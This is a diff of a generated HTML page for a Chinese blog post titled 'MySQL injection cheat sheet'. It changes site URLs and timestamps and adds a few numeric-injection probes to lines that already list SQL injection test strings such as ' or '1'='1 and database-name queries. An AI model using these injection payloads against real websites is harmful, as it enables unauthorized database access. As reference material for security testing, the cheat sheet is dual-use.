@@ -84,11 +84,11 @@
 <meta name="description" content="mysql注入备忘录">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mysql注入备忘录">
-<meta property="og:url" content="https://xianyu123.me/2019/01/25/mysql注入备忘录/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/01/25/mysql注入备忘录/index.html">
 <meta property="og:site_name" content="xianyu123&#39;s Blog">
 <meta property="og:description" content="mysql注入备忘录">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-21T00:43:34.480Z">
+<meta property="og:updated_time" content="2019-10-18T01:52:20.801Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql注入备忘录">
 <meta name="twitter:description" content="mysql注入备忘录">
@@ -121,7 +121,7 @@
 
 
 
-  <link rel="canonical" href="https://xianyu123.me/2019/01/25/mysql注入备忘录/">
+  <link rel="canonical" href="http://yoursite.com/2019/01/25/mysql注入备忘录/">
 
 
 
@@ -295,7 +295,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://xianyu123.me/2019/01/25/mysql注入备忘录/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/25/mysql注入备忘录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xianyu123">
@@ -497,7 +497,7 @@
 <p><strong>4、其他</strong> </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;+1 is not null#  &apos;in(-1,1)#  &apos;not in(1,0)#  &apos;like 1#  &apos;REGEXP 1#  &apos;BETWEEN 1 AND 1#  &apos;div 1#  &apos;xor 1#  &apos;=round(0,1)=&apos;1  &apos;&lt;&gt;ifnull(1,2)=&apos;1</span><br></pre></td></tr></table></figure>
 <h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>假设网址为<code>www.xxx.com/test.php?id=1</code></p>
-<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1+1</span><br><span class="line">id=-1 or 1=1</span><br><span class="line">id=-1 or 3-1</span><br><span class="line">id=1 and 1=1</span><br><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure>
+<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id=1+1</span><br><span class="line">id=1-1</span><br><span class="line">id=1/1</span><br><span class="line">id=1*0</span><br><span class="line">id=-1 or 1=1</span><br><span class="line">id=-1 or 3-1</span><br><span class="line">id=1 and 1=1</span><br><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure>
 <h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1'</span><br><span class="line">id=1"</span><br><span class="line">id=1' or '1'='1</span><br><span class="line">id=1" or "1"="1</span><br></pre></td></tr></table></figure>
 <h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><h4 id="库名长度"><a href="#库名长度" class="headerlink" title="库名长度"></a>库名长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())</span><br></pre></td></tr></table></figure>
 <h4 id="当前库名"><a href="#当前库名" class="headerlink" title="当前库名"></a>当前库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. database()</span><br><span class="line">2. schema()</span><br></pre></td></tr></table></figure>
@@ -600,9 +600,9 @@
   <p><span>本文标题:</span><a href="/2019/01/25/mysql注入备忘录/">mysql注入备忘录</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
   <p><span>发布时间:</span>2019年01月25日 - 21:57</p>
-  <p><span>最后更新:</span>2019年09月21日 - 08:43</p>
-  <p><span>原始链接:</span><a href="/2019/01/25/mysql注入备忘录/" title="mysql注入备忘录">https://xianyu123.me/2019/01/25/mysql注入备忘录/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xianyu123.me/2019/01/25/mysql注入备忘录/" aria-label="复制成功！"></i></span>
+  <p><span>最后更新:</span>2019年10月18日 - 09:52</p>
+  <p><span>原始链接:</span><a href="/2019/01/25/mysql注入备忘录/" title="mysql注入备忘录">http://yoursite.com/2019/01/25/mysql注入备忘录/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/01/25/mysql注入备忘录/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
